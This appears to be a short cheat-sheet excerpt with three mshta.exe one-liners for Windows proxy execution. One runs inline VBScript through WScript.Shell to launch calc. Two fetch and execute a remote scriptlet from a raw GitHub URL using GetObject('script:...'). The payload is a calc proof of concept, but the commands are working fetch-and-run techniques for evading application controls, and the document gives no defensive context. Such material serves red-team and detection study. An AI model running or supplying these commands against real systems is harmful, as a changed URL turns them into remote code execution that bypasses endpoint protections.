`mshta.exe javascript:"<script/language=vbscript>createobject(\"WScript.Shell\").run(\"calc\")</script>"`
<br><br>
`mshta.exe javascript:GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js");close();`
<br><br>
`mshta.exe vbscript:Close(Execute("GetObject(""script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js"")"))`
